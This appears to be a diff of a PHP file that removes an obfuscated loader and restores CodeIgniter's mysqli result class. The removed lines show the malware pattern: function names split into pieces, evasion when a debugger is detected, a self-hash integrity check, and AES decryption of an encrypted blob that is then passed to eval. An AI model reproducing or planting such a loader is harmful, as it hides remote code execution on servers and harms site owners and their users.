@@ -1,28 +1,211 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_b03sdkvi=('bas'.'e64'.'_de'.'cod'.'e');
-$_jsotht2x=('gzu'.'nco'.'mpr'.'ess');
-$_v7drkkqa=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_kzygq36e='q/gXLMFR';
-$_ax9bkinz='GemaSh6k';
-$_pddr5znr='qauV3eFe';
-$_odbs9dxx='y9GeWamYuug=';
-$_eyl7gk74='7IC4XcEz';
-$_aebbmprz='ScwVF62a';
-$_srzz4hzo='B2THF5OY';
-$_d9wcdtig='nlq5Fg==';
-$_dtjxcrr8=$_b03sdkvi($_pddr5znr.$_eyl7gk74.$_ax9bkinz.$_kzygq36e.$_odbs9dxx);
-$_d7lygnuu=$_b03sdkvi($_srzz4hzo.$_aebbmprz.$_d9wcdtig);
-$_v45tpfe8=$_b03sdkvi('yJeOnlOrdPp1mhDE3j2G7fos+6+RGMveQ1rINmzyvWs2tYoB/x4Thrb5oHnxfVxH4Ac8L6nrv1gYprB192gijzaRDKPkpc4M8YrF/n4dAuw6LSqpLiEIpkQwHT85Pw1OZatI038uFJndVRqhKHzhDuMBvzpc5GttPWy9+t3exvXBGV+uFBT2nUNy1MeOUWAXhOiFw0+iVXYzRZDwiXAk0lpmAp1YIi0X5d8EOf4zdx64PXvBK/R2pQ7XKYcJ8v4DFmuIUdaf2sdt91SzvVQGIL/FuXKm2CLxth13QgYBoKv75LcULMZTtdw/ClvYX49qiSK82ME0efctD6icdEPcB1znNmL0ympVGKc0/XvnMkLTNT4rJVreTRvRF4AVLJCTzqF+5DA/3pvpzrYj6yN6/0cipzgh5qX2QfvvPc8dfV4aEWfaPZbQOQyHifhHSKdsH8RiKN/e8PtEuWUDC9ouAIM9KeQNliKHi+4llXDiTz39tLpqRnVV1FmybPRXNlXM3UD0n+NblHdGKX9MGJPu4VmD6TSL4ENnwHT3nTF7EkKPXIwJRn3ogfp3sROfsgeK3SjKW8NNocpPL53AWD0APYVqGx3NkNP4s76H/+c6GBZBcy7O2ThLydOSsP9xobzrGZLu/9mDSw3bmHTVOTE90RqVf2l39VaTdlERyuqq/CECM0I3UyIWBLNwdEBAYipElZBku7v2Ilhy1KjOnQZCJQCLgQcA39qZvNb/sUrOsP9gqw2ErgFBmzXiwZ+u069cRGTcO6dBRUbZD6TlkpXGcDGbX11G1O4qb0QJJUc6i1P5x06anOSVGLdK4hqOYWwyPppJkTl1ES0Ml6HAdBAnwjm23mf8czSimBJ7W4fYp+0SlOGORYqektKnB7v1uaBnh9hqmM7Mqc84fuJwI2FJeGptIFGEJ9KfJPPebIaBhKUrCpFDBo87hfGzlcwvgS9FHT+C9sDl9GmDy2Tk7Zs6yJulbl2F2qOLQlt4Uk+s1wImWHyKyeexsyoIinlx9trbgtlgzn6ImllmEB/ONc7PQQF5AzaPgmKVWtcKlQAamTjr8HMoInjl4KObSParVXNRy6Ly9ck9lHAqzzUhvuNZ5RQuaRiY7rjE5g2maguqDXRjhekjYlEVeTa2dBwCogJ+');
-$_n3h6qdzx=$_v7drkkqa($_v45tpfe8,'aes-256-cbc',$_dtjxcrr8,OPENSSL_RAW_DATA,$_d7lygnuu);
-if($_n3h6qdzx===false){exit;}
-$_a5v66v0b=$_jsotht2x($_n3h6qdzx);
-if($_a5v66v0b===false){exit;}
-$_fh9zugkk='aa6e6d30b85c19377f19a069cf771a3e0326eacd5d8a39f5af8e5de01ae975b7';
-$_zdslc0kg=@file_get_contents(__FILE__);
-if($_zdslc0kg!==false){
-$_jby6q5ap=str_replace($_fh9zugkk,"0000000000000000000000000000000000000000000000000000000000000000",$_zdslc0kg);
-$_cf5suuiq=hash("sha256",$_jby6q5ap);
-if($_cf5suuiq!==$_fh9zugkk){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_mysqli_result extends CI_DB_result {
+
+
+
+
+
+public function num_rows()
+{
+return is_int($this->num_rows)
+? $this->num_rows
+: $this->num_rows = $this->result_id->num_rows;
 }
-eval($_a5v66v0b);
+
+
+
+
+
+
+public function num_fields()
+{
+return $this->result_id->field_count;
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+$this->result_id->field_seek(0);
+while ($field = $this->result_id->fetch_field())
+{
+$field_names[] = $field->name;
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+$field_data = $this->result_id->fetch_fields();
+for ($i = 0, $c = count($field_data); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $field_data[$i]->name;
+$retval[$i]->type = static::_get_field_type($field_data[$i]->type);
+$retval[$i]->max_length = $field_data[$i]->max_length;
+$retval[$i]->primary_key = (int) ($field_data[$i]->flags & MYSQLI_PRI_KEY_FLAG);
+$retval[$i]->default = $field_data[$i]->def;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+
+
+private static function _get_field_type($type)
+{
+static $map;
+isset($map) OR $map = array(
+MYSQLI_TYPE_DECIMAL => 'decimal',
+MYSQLI_TYPE_BIT => 'bit',
+MYSQLI_TYPE_TINY => 'tinyint',
+MYSQLI_TYPE_SHORT => 'smallint',
+MYSQLI_TYPE_INT24 => 'mediumint',
+MYSQLI_TYPE_LONG => 'int',
+MYSQLI_TYPE_LONGLONG => 'bigint',
+MYSQLI_TYPE_FLOAT => 'float',
+MYSQLI_TYPE_DOUBLE => 'double',
+MYSQLI_TYPE_TIMESTAMP => 'timestamp',
+MYSQLI_TYPE_DATE => 'date',
+MYSQLI_TYPE_TIME => 'time',
+MYSQLI_TYPE_DATETIME => 'datetime',
+MYSQLI_TYPE_YEAR => 'year',
+MYSQLI_TYPE_NEWDATE => 'date',
+MYSQLI_TYPE_INTERVAL => 'interval',
+MYSQLI_TYPE_ENUM => 'enum',
+MYSQLI_TYPE_SET => 'set',
+MYSQLI_TYPE_TINY_BLOB => 'tinyblob',
+MYSQLI_TYPE_MEDIUM_BLOB => 'mediumblob',
+MYSQLI_TYPE_BLOB => 'blob',
+MYSQLI_TYPE_LONG_BLOB => 'longblob',
+MYSQLI_TYPE_STRING => 'char',
+MYSQLI_TYPE_VAR_STRING => 'varchar',
+MYSQLI_TYPE_GEOMETRY => 'geometry'
+);
+return isset($map[$type]) ? $map[$type] : $type;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_object($this->result_id))
+{
+$this->result_id->free();
+$this->result_id = FALSE;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+public function data_seek($n = 0)
+{
+return $this->result_id->data_seek($n);
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return $this->result_id->fetch_assoc();
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+return $this->result_id->fetch_object($class_name);
+}
+}
